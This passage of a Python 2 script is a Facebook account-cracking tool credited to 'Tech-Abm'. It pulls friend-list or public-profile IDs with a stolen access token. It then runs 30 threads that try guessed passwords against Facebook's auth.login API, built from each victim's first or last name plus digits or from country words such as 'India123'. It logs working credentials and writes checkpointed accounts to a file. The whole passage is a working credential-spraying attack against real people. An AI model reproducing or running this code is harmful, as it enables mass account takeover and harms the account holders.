								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = ('Bangladesh123') 
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = ('Bangal786') 
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def pakarmy():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print "\033[1;97m «--------------------------------------------»"
	print( "\x1b[1;32;92m[1] \033[1;33;93m>>\033[1;97m Crack From Friendlist ") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;98m>>\033[1;97m Crack From Public ID ") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;97m «--------------------------------------------»"
	pilih_pakarmy()

def pilih_pakarmy():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_pakarmy()
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('Hindustan')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = ('India123') 
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = ('Kalimata123') 
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def hackerz():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print "\033[1;97m «--------------------------------------------»"
	print( "\x1b[1;32;92m[1] \033[1;33;93m>>\033[1;93m Crack From Friendlist ") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;98m>>\033[1;93m Crack From Public ID ") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;97m «--------------------------------------------»"
	pilih_hackerz()

def pilih_hackerz():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_hackerz()
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID  "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = y['first_name'] + '@123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['last_name'] + '@123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '@12345@'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '@786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '@12345@'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['first_name'] + '@@12345@@'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	login()
	
if __name__ == '__main__':
	login()


